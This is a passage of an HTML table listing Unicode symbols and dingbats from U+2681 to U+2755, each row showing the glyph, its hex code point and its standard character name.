<td style="text-align:center">2681</td>
<td style="text-align:center">DIE FACE-2</td>
</tr>
<tr>
<td style="text-align:center">⚂</td>
<td style="text-align:center">2682</td>
<td style="text-align:center">DIE FACE-3</td>
</tr>
<tr>
<td style="text-align:center">⚃</td>
<td style="text-align:center">2683</td>
<td style="text-align:center">DIE FACE-4</td>
</tr>
<tr>
<td style="text-align:center">⚄</td>
<td style="text-align:center">2684</td>
<td style="text-align:center">DIE FACE-5</td>
</tr>
<tr>
<td style="text-align:center">⚅</td>
<td style="text-align:center">2685</td>
<td style="text-align:center">DIE FACE-6</td>
</tr>
<tr>
<td style="text-align:center">⚆</td>
<td style="text-align:center">2686</td>
<td style="text-align:center">WHITE CIRCLE WITH DOT RIGHT</td>
</tr>
<tr>
<td style="text-align:center">⚇</td>
<td style="text-align:center">2687</td>
<td style="text-align:center">WHITE CIRCLE WITH TWO DOTS</td>
</tr>
<tr>
<td style="text-align:center">⚈</td>
<td style="text-align:center">2688</td>
<td style="text-align:center">BLACK CIRCLE WITH WHITE DOT RIGHT</td>
</tr>
<tr>
<td style="text-align:center">⚉</td>
<td style="text-align:center">2689</td>
<td style="text-align:center">BLACK CIRCLE WITH TWO WHITE DOTS</td>
</tr>
<tr>
<td style="text-align:center">⚊</td>
<td style="text-align:center">268A</td>
<td style="text-align:center">MONOGRAM FOR YANG</td>
</tr>
<tr>
<td style="text-align:center">⚋</td>
<td style="text-align:center">268B</td>
<td style="text-align:center">MONOGRAM FOR YIN</td>
</tr>
<tr>
<td style="text-align:center">⚌</td>
<td style="text-align:center">268C</td>
<td style="text-align:center">DIGRAM FOR GREATER YANG</td>
</tr>
<tr>
<td style="text-align:center">⚍</td>
<td style="text-align:center">268D</td>
<td style="text-align:center">DIGRAM FOR LESSER YIN</td>
</tr>
<tr>
<td style="text-align:center">⚎</td>
<td style="text-align:center">268E</td>
<td style="text-align:center">DIGRAM FOR LESSER YANG</td>
</tr>
<tr>
<td style="text-align:center">⚏</td>
<td style="text-align:center">268F</td>
<td style="text-align:center">DIGRAM FOR GREATER YIN</td>
</tr>
<tr>
<td style="text-align:center">⚐</td>
<td style="text-align:center">2690</td>
<td style="text-align:center">WHITE FLAG</td>
</tr>
<tr>
<td style="text-align:center">⚑</td>
<td style="text-align:center">2691</td>
<td style="text-align:center">BLACK FLAG</td>
</tr>
<tr>
<td style="text-align:center">⚒</td>
<td style="text-align:center">2692</td>
<td style="text-align:center">HAMMER AND PICK</td>
</tr>
<tr>
<td style="text-align:center">⚓</td>
<td style="text-align:center">2693</td>
<td style="text-align:center">ANCHOR</td>
</tr>
<tr>
<td style="text-align:center">⚔</td>
<td style="text-align:center">2694</td>
<td style="text-align:center">CROSSED SWORDS</td>
</tr>
<tr>
<td style="text-align:center">⚕</td>
<td style="text-align:center">2695</td>
<td style="text-align:center">STAFF OF AESCULAPIUS</td>
</tr>
<tr>
<td style="text-align:center">⚖</td>
<td style="text-align:center">2696</td>
<td style="text-align:center">SCALES</td>
</tr>
<tr>
<td style="text-align:center">⚗</td>
<td style="text-align:center">2697</td>
<td style="text-align:center">ALEMBIC</td>
</tr>
<tr>
<td style="text-align:center">⚘</td>
<td style="text-align:center">2698</td>
<td style="text-align:center">FLOWER</td>
</tr>
<tr>
<td style="text-align:center">⚙</td>
<td style="text-align:center">2699</td>
<td style="text-align:center">GEAR</td>
</tr>
<tr>
<td style="text-align:center">⚚</td>
<td style="text-align:center">269A</td>
<td style="text-align:center">STAFF OF HERMES</td>
</tr>
<tr>
<td style="text-align:center">⚛</td>
<td style="text-align:center">269B</td>
<td style="text-align:center">ATOM SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">⚜</td>
<td style="text-align:center">269C</td>
<td style="text-align:center">FLEUR-DE-LIS</td>
</tr>
<tr>
<td style="text-align:center">⚝</td>
<td style="text-align:center">269D</td>
<td style="text-align:center">OUTLINED WHITE STAR</td>
</tr>
<tr>
<td style="text-align:center">⚞</td>
<td style="text-align:center">269E</td>
<td style="text-align:center">THREE LINES CONVERGING RIGHT</td>
</tr>
<tr>
<td style="text-align:center">⚟</td>
<td style="text-align:center">269F</td>
<td style="text-align:center">THREE LINES CONVERGING LEFT</td>
</tr>
<tr>
<td style="text-align:center">⚠</td>
<td style="text-align:center">26A0</td>
<td style="text-align:center">WARNING SIGN</td>
</tr>
<tr>
<td style="text-align:center">⚡</td>
<td style="text-align:center">26A1</td>
<td style="text-align:center">HIGH VOLTAGE SIGN</td>
</tr>
<tr>
<td style="text-align:center">⚢</td>
<td style="text-align:center">26A2</td>
<td style="text-align:center">DOUBLED FEMALE SIGN</td>
</tr>
<tr>
<td style="text-align:center">⚣</td>
<td style="text-align:center">26A3</td>
<td style="text-align:center">DOUBLED MALE SIGN</td>
</tr>
<tr>
<td style="text-align:center">⚤</td>
<td style="text-align:center">26A4</td>
<td style="text-align:center">INTERLOCKED FEMALE AND MALE SIGN</td>
</tr>
<tr>
<td style="text-align:center">⚥</td>
<td style="text-align:center">26A5</td>
<td style="text-align:center">MALE AND FEMALE SIGN</td>
</tr>
<tr>
<td style="text-align:center">⚦</td>
<td style="text-align:center">26A6</td>
<td style="text-align:center">MALE WITH STROKE SIGN</td>
</tr>
<tr>
<td style="text-align:center">⚧</td>
<td style="text-align:center">26A7</td>
<td style="text-align:center">MALE WITH STROKE AND MALE AND FEMALE SIGN</td>
</tr>
<tr>
<td style="text-align:center">⚨</td>
<td style="text-align:center">26A8</td>
<td style="text-align:center">VERTICAL MALE WITH STROKE SIGN</td>
</tr>
<tr>
<td style="text-align:center">⚩</td>
<td style="text-align:center">26A9</td>
<td style="text-align:center">HORIZONTAL MALE WITH STROKE SIGN</td>
</tr>
<tr>
<td style="text-align:center">⚪</td>
<td style="text-align:center">26AA</td>
<td style="text-align:center">MEDIUM WHITE CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">⚫</td>
<td style="text-align:center">26AB</td>
<td style="text-align:center">MEDIUM BLACK CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">⚬</td>
<td style="text-align:center">26AC</td>
<td style="text-align:center">MEDIUM SMALL WHITE CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">⚭</td>
<td style="text-align:center">26AD</td>
<td style="text-align:center">MARRIAGE SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">⚮</td>
<td style="text-align:center">26AE</td>
<td style="text-align:center">DIVORCE SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">⚯</td>
<td style="text-align:center">26AF</td>
<td style="text-align:center">UNMARRIED PARTNERSHIP SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">⚰</td>
<td style="text-align:center">26B0</td>
<td style="text-align:center">COFFIN</td>
</tr>
<tr>
<td style="text-align:center">⚱</td>
<td style="text-align:center">26B1</td>
<td style="text-align:center">FUNERAL URN</td>
</tr>
<tr>
<td style="text-align:center">⚲</td>
<td style="text-align:center">26B2</td>
<td style="text-align:center">NEUTER</td>
</tr>
<tr>
<td style="text-align:center">⚳</td>
<td style="text-align:center">26B3</td>
<td style="text-align:center">CERES</td>
</tr>
<tr>
<td style="text-align:center">⚴</td>
<td style="text-align:center">26B4</td>
<td style="text-align:center">PALLAS</td>
</tr>
<tr>
<td style="text-align:center">⚵</td>
<td style="text-align:center">26B5</td>
<td style="text-align:center">JUNO</td>
</tr>
<tr>
<td style="text-align:center">⚶</td>
<td style="text-align:center">26B6</td>
<td style="text-align:center">VESTA</td>
</tr>
<tr>
<td style="text-align:center">⚷</td>
<td style="text-align:center">26B7</td>
<td style="text-align:center">CHIRON</td>
</tr>
<tr>
<td style="text-align:center">⚸</td>
<td style="text-align:center">26B8</td>
<td style="text-align:center">BLACK MOON LILITH</td>
</tr>
<tr>
<td style="text-align:center">⚹</td>
<td style="text-align:center">26B9</td>
<td style="text-align:center">SEXTILE</td>
</tr>
<tr>
<td style="text-align:center">⚺</td>
<td style="text-align:center">26BA</td>
<td style="text-align:center">SEMISEXTILE</td>
</tr>
<tr>
<td style="text-align:center">⚻</td>
<td style="text-align:center">26BB</td>
<td style="text-align:center">QUINCUNX</td>
</tr>
<tr>
<td style="text-align:center">⚼</td>
<td style="text-align:center">26BC</td>
<td style="text-align:center">SESQUIQUADRATE</td>
</tr>
<tr>
<td style="text-align:center">⚽</td>
<td style="text-align:center">26BD</td>
<td style="text-align:center">SOCCER BALL</td>
</tr>
<tr>
<td style="text-align:center">⚾</td>
<td style="text-align:center">26BE</td>
<td style="text-align:center">BASEBALL</td>
</tr>
<tr>
<td style="text-align:center">⚿</td>
<td style="text-align:center">26BF</td>
<td style="text-align:center">SQUARED KEY</td>
</tr>
<tr>
<td style="text-align:center">⛀</td>
<td style="text-align:center">26C0</td>
<td style="text-align:center">WHITE DRAUGHTS MAN</td>
</tr>
<tr>
<td style="text-align:center">⛁</td>
<td style="text-align:center">26C1</td>
<td style="text-align:center">WHITE DRAUGHTS KING</td>
</tr>
<tr>
<td style="text-align:center">⛂</td>
<td style="text-align:center">26C2</td>
<td style="text-align:center">BLACK DRAUGHTS MAN</td>
</tr>
<tr>
<td style="text-align:center">⛃</td>
<td style="text-align:center">26C3</td>
<td style="text-align:center">BLACK DRAUGHTS KING</td>
</tr>
<tr>
<td style="text-align:center">⛄</td>
<td style="text-align:center">26C4</td>
<td style="text-align:center">SNOWMAN WITHOUT SNOW</td>
</tr>
<tr>
<td style="text-align:center">⛅</td>
<td style="text-align:center">26C5</td>
<td style="text-align:center">SUN BEHIND CLOUD</td>
</tr>
<tr>
<td style="text-align:center">⛆</td>
<td style="text-align:center">26C6</td>
<td style="text-align:center">RAIN</td>
</tr>
<tr>
<td style="text-align:center">⛇</td>
<td style="text-align:center">26C7</td>
<td style="text-align:center">BLACK SNOWMAN</td>
</tr>
<tr>
<td style="text-align:center">⛈</td>
<td style="text-align:center">26C8</td>
<td style="text-align:center">THUNDER CLOUD AND RAIN</td>
</tr>
<tr>
<td style="text-align:center">⛉</td>
<td style="text-align:center">26C9</td>
<td style="text-align:center">TURNED WHITE SHOGI PIECE</td>
</tr>
<tr>
<td style="text-align:center">⛊</td>
<td style="text-align:center">26CA</td>
<td style="text-align:center">TURNED BLACK SHOGI PIECE</td>
</tr>
<tr>
<td style="text-align:center">⛋</td>
<td style="text-align:center">26CB</td>
<td style="text-align:center">WHITE DIAMOND IN SQUARE</td>
</tr>
<tr>
<td style="text-align:center">⛌</td>
<td style="text-align:center">26CC</td>
<td style="text-align:center">CROSSING LANES</td>
</tr>
<tr>
<td style="text-align:center">⛍</td>
<td style="text-align:center">26CD</td>
<td style="text-align:center">DISABLED CAR</td>
</tr>
<tr>
<td style="text-align:center">⛎</td>
<td style="text-align:center">26CE</td>
<td style="text-align:center">OPHIUCHUS</td>
</tr>
<tr>
<td style="text-align:center">⛏</td>
<td style="text-align:center">26CF</td>
<td style="text-align:center">PICK</td>
</tr>
<tr>
<td style="text-align:center">⛐</td>
<td style="text-align:center">26D0</td>
<td style="text-align:center">CAR SLIDING</td>
</tr>
<tr>
<td style="text-align:center">⛑</td>
<td style="text-align:center">26D1</td>
<td style="text-align:center">HELMET WITH WHITE CROSS</td>
</tr>
<tr>
<td style="text-align:center">⛒</td>
<td style="text-align:center">26D2</td>
<td style="text-align:center">CIRCLED CROSSING LANES</td>
</tr>
<tr>
<td style="text-align:center">⛓</td>
<td style="text-align:center">26D3</td>
<td style="text-align:center">CHAINS</td>
</tr>
<tr>
<td style="text-align:center">⛔</td>
<td style="text-align:center">26D4</td>
<td style="text-align:center">NO ENTRY</td>
</tr>
<tr>
<td style="text-align:center">⛕</td>
<td style="text-align:center">26D5</td>
<td style="text-align:center">ALTERNATE ONE-WAY LEFT WAY TRAFFIC</td>
</tr>
<tr>
<td style="text-align:center">⛖</td>
<td style="text-align:center">26D6</td>
<td style="text-align:center">BLACK TWO-WAY LEFT WAY TRAFFIC</td>
</tr>
<tr>
<td style="text-align:center">⛗</td>
<td style="text-align:center">26D7</td>
<td style="text-align:center">WHITE TWO-WAY LEFT WAY TRAFFIC</td>
</tr>
<tr>
<td style="text-align:center">⛘</td>
<td style="text-align:center">26D8</td>
<td style="text-align:center">BLACK LEFT LANE MERGE</td>
</tr>
<tr>
<td style="text-align:center">⛙</td>
<td style="text-align:center">26D9</td>
<td style="text-align:center">WHITE LEFT LANE MERGE</td>
</tr>
<tr>
<td style="text-align:center">⛚</td>
<td style="text-align:center">26DA</td>
<td style="text-align:center">DRIVE SLOW SIGN</td>
</tr>
<tr>
<td style="text-align:center">⛛</td>
<td style="text-align:center">26DB</td>
<td style="text-align:center">HEAVY WHITE DOWN-POINTING TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">⛜</td>
<td style="text-align:center">26DC</td>
<td style="text-align:center">LEFT CLOSED ENTRY</td>
</tr>
<tr>
<td style="text-align:center">⛝</td>
<td style="text-align:center">26DD</td>
<td style="text-align:center">SQUARED SALTIRE</td>
</tr>
<tr>
<td style="text-align:center">⛞</td>
<td style="text-align:center">26DE</td>
<td style="text-align:center">FALLING DIAGONAL IN WHITE CIRCLE IN BLACK SQUARE</td>
</tr>
<tr>
<td style="text-align:center">⛟</td>
<td style="text-align:center">26DF</td>
<td style="text-align:center">BLACK TRUCK</td>
</tr>
<tr>
<td style="text-align:center">⛠</td>
<td style="text-align:center">26E0</td>
<td style="text-align:center">RESTRICTED LEFT ENTRY-1</td>
</tr>
<tr>
<td style="text-align:center">⛡</td>
<td style="text-align:center">26E1</td>
<td style="text-align:center">RESTRICTED LEFT ENTRY-2</td>
</tr>
<tr>
<td style="text-align:center">⛢</td>
<td style="text-align:center">26E2</td>
<td style="text-align:center">ASTRONOMICAL SYMBOL FOR URANUS</td>
</tr>
<tr>
<td style="text-align:center">⛣</td>
<td style="text-align:center">26E3</td>
<td style="text-align:center">HEAVY CIRCLE WITH STROKE AND TWO DOTS ABOVE</td>
</tr>
<tr>
<td style="text-align:center">⛤</td>
<td style="text-align:center">26E4</td>
<td style="text-align:center">PENTAGRAM</td>
</tr>
<tr>
<td style="text-align:center">⛥</td>
<td style="text-align:center">26E5</td>
<td style="text-align:center">RIGHT-HANDED INTERLACED PENTAGRAM</td>
</tr>
<tr>
<td style="text-align:center">⛦</td>
<td style="text-align:center">26E6</td>
<td style="text-align:center">LEFT-HANDED INTERLACED PENTAGRAM</td>
</tr>
<tr>
<td style="text-align:center">⛧</td>
<td style="text-align:center">26E7</td>
<td style="text-align:center">INVERTED PENTAGRAM</td>
</tr>
<tr>
<td style="text-align:center">⛨</td>
<td style="text-align:center">26E8</td>
<td style="text-align:center">BLACK CROSS ON SHIELD</td>
</tr>
<tr>
<td style="text-align:center">⛩</td>
<td style="text-align:center">26E9</td>
<td style="text-align:center">SHINTO SHRINE</td>
</tr>
<tr>
<td style="text-align:center">⛪</td>
<td style="text-align:center">26EA</td>
<td style="text-align:center">CHURCH</td>
</tr>
<tr>
<td style="text-align:center">⛫</td>
<td style="text-align:center">26EB</td>
<td style="text-align:center">CASTLE</td>
</tr>
<tr>
<td style="text-align:center">⛬</td>
<td style="text-align:center">26EC</td>
<td style="text-align:center">HISTORIC SITE</td>
</tr>
<tr>
<td style="text-align:center">⛭</td>
<td style="text-align:center">26ED</td>
<td style="text-align:center">GEAR WITHOUT HUB</td>
</tr>
<tr>
<td style="text-align:center">⛮</td>
<td style="text-align:center">26EE</td>
<td style="text-align:center">GEAR WITH HANDLES</td>
</tr>
<tr>
<td style="text-align:center">⛯</td>
<td style="text-align:center">26EF</td>
<td style="text-align:center">MAP SYMBOL FOR LIGHTHOUSE</td>
</tr>
<tr>
<td style="text-align:center">⛰</td>
<td style="text-align:center">26F0</td>
<td style="text-align:center">MOUNTAIN</td>
</tr>
<tr>
<td style="text-align:center">⛱</td>
<td style="text-align:center">26F1</td>
<td style="text-align:center">UMBRELLA ON GROUND</td>
</tr>
<tr>
<td style="text-align:center">⛲</td>
<td style="text-align:center">26F2</td>
<td style="text-align:center">FOUNTAIN</td>
</tr>
<tr>
<td style="text-align:center">⛳</td>
<td style="text-align:center">26F3</td>
<td style="text-align:center">FLAG IN HOLE</td>
</tr>
<tr>
<td style="text-align:center">⛴</td>
<td style="text-align:center">26F4</td>
<td style="text-align:center">FERRY</td>
</tr>
<tr>
<td style="text-align:center">⛵</td>
<td style="text-align:center">26F5</td>
<td style="text-align:center">SAILBOAT</td>
</tr>
<tr>
<td style="text-align:center">⛶</td>
<td style="text-align:center">26F6</td>
<td style="text-align:center">SQUARE FOUR CORNERS</td>
</tr>
<tr>
<td style="text-align:center">⛷</td>
<td style="text-align:center">26F7</td>
<td style="text-align:center">SKIER</td>
</tr>
<tr>
<td style="text-align:center">⛸</td>
<td style="text-align:center">26F8</td>
<td style="text-align:center">ICE SKATE</td>
</tr>
<tr>
<td style="text-align:center">⛹</td>
<td style="text-align:center">26F9</td>
<td style="text-align:center">PERSON WITH BALL</td>
</tr>
<tr>
<td style="text-align:center">⛺</td>
<td style="text-align:center">26FA</td>
<td style="text-align:center">TENT</td>
</tr>
<tr>
<td style="text-align:center">⛻</td>
<td style="text-align:center">26FB</td>
<td style="text-align:center">JAPANESE BANK SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">⛼</td>
<td style="text-align:center">26FC</td>
<td style="text-align:center">HEADSTONE GRAVEYARD SYMBOL</td>
</tr>
<tr>
<td style="text-align:center">⛽</td>
<td style="text-align:center">26FD</td>
<td style="text-align:center">FUEL PUMP</td>
</tr>
<tr>
<td style="text-align:center">⛾</td>
<td style="text-align:center">26FE</td>
<td style="text-align:center">CUP ON BLACK SQUARE</td>
</tr>
<tr>
<td style="text-align:center">⛿</td>
<td style="text-align:center">26FF</td>
<td style="text-align:center">WHITE FLAG WITH HORIZONTAL MIDDLE BLACK STRIPE</td>
</tr>
<tr>
<td style="text-align:center">✁</td>
<td style="text-align:center">2701</td>
<td style="text-align:center">UPPER BLADE SCISSORS</td>
</tr>
<tr>
<td style="text-align:center">✂</td>
<td style="text-align:center">2702</td>
<td style="text-align:center">BLACK SCISSORS</td>
</tr>
<tr>
<td style="text-align:center">✃</td>
<td style="text-align:center">2703</td>
<td style="text-align:center">LOWER BLADE SCISSORS</td>
</tr>
<tr>
<td style="text-align:center">✄</td>
<td style="text-align:center">2704</td>
<td style="text-align:center">WHITE SCISSORS</td>
</tr>
<tr>
<td style="text-align:center">✅</td>
<td style="text-align:center">2705</td>
<td style="text-align:center">WHITE HEAVY CHECK MARK</td>
</tr>
<tr>
<td style="text-align:center">✆</td>
<td style="text-align:center">2706</td>
<td style="text-align:center">TELEPHONE LOCATION SIGN</td>
</tr>
<tr>
<td style="text-align:center">✇</td>
<td style="text-align:center">2707</td>
<td style="text-align:center">TAPE DRIVE</td>
</tr>
<tr>
<td style="text-align:center">✈</td>
<td style="text-align:center">2708</td>
<td style="text-align:center">AIRPLANE</td>
</tr>
<tr>
<td style="text-align:center">✉</td>
<td style="text-align:center">2709</td>
<td style="text-align:center">ENVELOPE</td>
</tr>
<tr>
<td style="text-align:center">✊</td>
<td style="text-align:center">270A</td>
<td style="text-align:center">RAISED FIST</td>
</tr>
<tr>
<td style="text-align:center">✋</td>
<td style="text-align:center">270B</td>
<td style="text-align:center">RAISED HAND</td>
</tr>
<tr>
<td style="text-align:center">✌</td>
<td style="text-align:center">270C</td>
<td style="text-align:center">VICTORY HAND</td>
</tr>
<tr>
<td style="text-align:center">✍</td>
<td style="text-align:center">270D</td>
<td style="text-align:center">WRITING HAND</td>
</tr>
<tr>
<td style="text-align:center">✎</td>
<td style="text-align:center">270E</td>
<td style="text-align:center">LOWER RIGHT PENCIL</td>
</tr>
<tr>
<td style="text-align:center">✏</td>
<td style="text-align:center">270F</td>
<td style="text-align:center">PENCIL</td>
</tr>
<tr>
<td style="text-align:center">✐</td>
<td style="text-align:center">2710</td>
<td style="text-align:center">UPPER RIGHT PENCIL</td>
</tr>
<tr>
<td style="text-align:center">✑</td>
<td style="text-align:center">2711</td>
<td style="text-align:center">WHITE NIB</td>
</tr>
<tr>
<td style="text-align:center">✒</td>
<td style="text-align:center">2712</td>
<td style="text-align:center">BLACK NIB</td>
</tr>
<tr>
<td style="text-align:center">✓</td>
<td style="text-align:center">2713</td>
<td style="text-align:center">CHECK MARK</td>
</tr>
<tr>
<td style="text-align:center">✔</td>
<td style="text-align:center">2714</td>
<td style="text-align:center">HEAVY CHECK MARK</td>
</tr>
<tr>
<td style="text-align:center">✕</td>
<td style="text-align:center">2715</td>
<td style="text-align:center">MULTIPLICATION X</td>
</tr>
<tr>
<td style="text-align:center">✖</td>
<td style="text-align:center">2716</td>
<td style="text-align:center">HEAVY MULTIPLICATION X</td>
</tr>
<tr>
<td style="text-align:center">✗</td>
<td style="text-align:center">2717</td>
<td style="text-align:center">BALLOT X</td>
</tr>
<tr>
<td style="text-align:center">✘</td>
<td style="text-align:center">2718</td>
<td style="text-align:center">HEAVY BALLOT X</td>
</tr>
<tr>
<td style="text-align:center">✙</td>
<td style="text-align:center">2719</td>
<td style="text-align:center">OUTLINED GREEK CROSS</td>
</tr>
<tr>
<td style="text-align:center">✚</td>
<td style="text-align:center">271A</td>
<td style="text-align:center">HEAVY GREEK CROSS</td>
</tr>
<tr>
<td style="text-align:center">✛</td>
<td style="text-align:center">271B</td>
<td style="text-align:center">OPEN CENTRE CROSS</td>
</tr>
<tr>
<td style="text-align:center">✜</td>
<td style="text-align:center">271C</td>
<td style="text-align:center">HEAVY OPEN CENTRE CROSS</td>
</tr>
<tr>
<td style="text-align:center">✝</td>
<td style="text-align:center">271D</td>
<td style="text-align:center">LATIN CROSS</td>
</tr>
<tr>
<td style="text-align:center">✞</td>
<td style="text-align:center">271E</td>
<td style="text-align:center">SHADOWED WHITE LATIN CROSS</td>
</tr>
<tr>
<td style="text-align:center">✟</td>
<td style="text-align:center">271F</td>
<td style="text-align:center">OUTLINED LATIN CROSS</td>
</tr>
<tr>
<td style="text-align:center">✠</td>
<td style="text-align:center">2720</td>
<td style="text-align:center">MALTESE CROSS</td>
</tr>
<tr>
<td style="text-align:center">✡</td>
<td style="text-align:center">2721</td>
<td style="text-align:center">STAR OF DAVID</td>
</tr>
<tr>
<td style="text-align:center">✢</td>
<td style="text-align:center">2722</td>
<td style="text-align:center">FOUR TEARDROP-SPOKED ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">✣</td>
<td style="text-align:center">2723</td>
<td style="text-align:center">FOUR BALLOON-SPOKED ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">✤</td>
<td style="text-align:center">2724</td>
<td style="text-align:center">HEAVY FOUR BALLOON-SPOKED ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">✥</td>
<td style="text-align:center">2725</td>
<td style="text-align:center">FOUR CLUB-SPOKED ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">✦</td>
<td style="text-align:center">2726</td>
<td style="text-align:center">BLACK FOUR POINTED STAR</td>
</tr>
<tr>
<td style="text-align:center">✧</td>
<td style="text-align:center">2727</td>
<td style="text-align:center">WHITE FOUR POINTED STAR</td>
</tr>
<tr>
<td style="text-align:center">✨</td>
<td style="text-align:center">2728</td>
<td style="text-align:center">SPARKLES</td>
</tr>
<tr>
<td style="text-align:center">✩</td>
<td style="text-align:center">2729</td>
<td style="text-align:center">STRESS OUTLINED WHITE STAR</td>
</tr>
<tr>
<td style="text-align:center">✪</td>
<td style="text-align:center">272A</td>
<td style="text-align:center">CIRCLED WHITE STAR</td>
</tr>
<tr>
<td style="text-align:center">✫</td>
<td style="text-align:center">272B</td>
<td style="text-align:center">OPEN CENTRE BLACK STAR</td>
</tr>
<tr>
<td style="text-align:center">✬</td>
<td style="text-align:center">272C</td>
<td style="text-align:center">BLACK CENTRE WHITE STAR</td>
</tr>
<tr>
<td style="text-align:center">✭</td>
<td style="text-align:center">272D</td>
<td style="text-align:center">OUTLINED BLACK STAR</td>
</tr>
<tr>
<td style="text-align:center">✮</td>
<td style="text-align:center">272E</td>
<td style="text-align:center">HEAVY OUTLINED BLACK STAR</td>
</tr>
<tr>
<td style="text-align:center">✯</td>
<td style="text-align:center">272F</td>
<td style="text-align:center">PINWHEEL STAR</td>
</tr>
<tr>
<td style="text-align:center">✰</td>
<td style="text-align:center">2730</td>
<td style="text-align:center">SHADOWED WHITE STAR</td>
</tr>
<tr>
<td style="text-align:center">✱</td>
<td style="text-align:center">2731</td>
<td style="text-align:center">HEAVY ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">✲</td>
<td style="text-align:center">2732</td>
<td style="text-align:center">OPEN CENTRE ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">✳</td>
<td style="text-align:center">2733</td>
<td style="text-align:center">EIGHT SPOKED ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">✴</td>
<td style="text-align:center">2734</td>
<td style="text-align:center">EIGHT POINTED BLACK STAR</td>
</tr>
<tr>
<td style="text-align:center">✵</td>
<td style="text-align:center">2735</td>
<td style="text-align:center">EIGHT POINTED PINWHEEL STAR</td>
</tr>
<tr>
<td style="text-align:center">✶</td>
<td style="text-align:center">2736</td>
<td style="text-align:center">SIX POINTED BLACK STAR</td>
</tr>
<tr>
<td style="text-align:center">✷</td>
<td style="text-align:center">2737</td>
<td style="text-align:center">EIGHT POINTED RECTILINEAR BLACK STAR</td>
</tr>
<tr>
<td style="text-align:center">✸</td>
<td style="text-align:center">2738</td>
<td style="text-align:center">HEAVY EIGHT POINTED RECTILINEAR BLACK STAR</td>
</tr>
<tr>
<td style="text-align:center">✹</td>
<td style="text-align:center">2739</td>
<td style="text-align:center">TWELVE POINTED BLACK STAR</td>
</tr>
<tr>
<td style="text-align:center">✺</td>
<td style="text-align:center">273A</td>
<td style="text-align:center">SIXTEEN POINTED ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">✻</td>
<td style="text-align:center">273B</td>
<td style="text-align:center">TEARDROP-SPOKED ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">✼</td>
<td style="text-align:center">273C</td>
<td style="text-align:center">OPEN CENTRE TEARDROP-SPOKED ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">✽</td>
<td style="text-align:center">273D</td>
<td style="text-align:center">HEAVY TEARDROP-SPOKED ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">✾</td>
<td style="text-align:center">273E</td>
<td style="text-align:center">SIX PETALLED BLACK AND WHITE FLORETTE</td>
</tr>
<tr>
<td style="text-align:center">✿</td>
<td style="text-align:center">273F</td>
<td style="text-align:center">BLACK FLORETTE</td>
</tr>
<tr>
<td style="text-align:center">❀</td>
<td style="text-align:center">2740</td>
<td style="text-align:center">WHITE FLORETTE</td>
</tr>
<tr>
<td style="text-align:center">❁</td>
<td style="text-align:center">2741</td>
<td style="text-align:center">EIGHT PETALLED OUTLINED BLACK FLORETTE</td>
</tr>
<tr>
<td style="text-align:center">❂</td>
<td style="text-align:center">2742</td>
<td style="text-align:center">CIRCLED OPEN CENTRE EIGHT POINTED STAR</td>
</tr>
<tr>
<td style="text-align:center">❃</td>
<td style="text-align:center">2743</td>
<td style="text-align:center">HEAVY TEARDROP-SPOKED PINWHEEL ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">❄</td>
<td style="text-align:center">2744</td>
<td style="text-align:center">SNOWFLAKE</td>
</tr>
<tr>
<td style="text-align:center">❅</td>
<td style="text-align:center">2745</td>
<td style="text-align:center">TIGHT TRIFOLIATE SNOWFLAKE</td>
</tr>
<tr>
<td style="text-align:center">❆</td>
<td style="text-align:center">2746</td>
<td style="text-align:center">HEAVY CHEVRON SNOWFLAKE</td>
</tr>
<tr>
<td style="text-align:center">❇</td>
<td style="text-align:center">2747</td>
<td style="text-align:center">SPARKLE</td>
</tr>
<tr>
<td style="text-align:center">❈</td>
<td style="text-align:center">2748</td>
<td style="text-align:center">HEAVY SPARKLE</td>
</tr>
<tr>
<td style="text-align:center">❉</td>
<td style="text-align:center">2749</td>
<td style="text-align:center">BALLOON-SPOKED ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">❊</td>
<td style="text-align:center">274A</td>
<td style="text-align:center">EIGHT TEARDROP-SPOKED PROPELLER ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">❋</td>
<td style="text-align:center">274B</td>
<td style="text-align:center">HEAVY EIGHT TEARDROP-SPOKED PROPELLER ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">❌</td>
<td style="text-align:center">274C</td>
<td style="text-align:center">CROSS MARK</td>
</tr>
<tr>
<td style="text-align:center">❍</td>
<td style="text-align:center">274D</td>
<td style="text-align:center">SHADOWED WHITE CIRCLE</td>
</tr>
<tr>
<td style="text-align:center">❎</td>
<td style="text-align:center">274E</td>
<td style="text-align:center">NEGATIVE SQUARED CROSS MARK</td>
</tr>
<tr>
<td style="text-align:center">❏</td>
<td style="text-align:center">274F</td>
<td style="text-align:center">LOWER RIGHT DROP-SHADOWED WHITE SQUARE</td>
</tr>
<tr>
<td style="text-align:center">❐</td>
<td style="text-align:center">2750</td>
<td style="text-align:center">UPPER RIGHT DROP-SHADOWED WHITE SQUARE</td>
</tr>
<tr>
<td style="text-align:center">❑</td>
<td style="text-align:center">2751</td>
<td style="text-align:center">LOWER RIGHT SHADOWED WHITE SQUARE</td>
</tr>
<tr>
<td style="text-align:center">❒</td>
<td style="text-align:center">2752</td>
<td style="text-align:center">UPPER RIGHT SHADOWED WHITE SQUARE</td>
</tr>
<tr>
<td style="text-align:center">❓</td>
<td style="text-align:center">2753</td>
<td style="text-align:center">BLACK QUESTION MARK ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❔</td>
<td style="text-align:center">2754</td>
<td style="text-align:center">WHITE QUESTION MARK ORNAMENT</td>
</tr>
<tr>
<td style="text-align:center">❕</td>
<td style="text-align:center">2755</td>
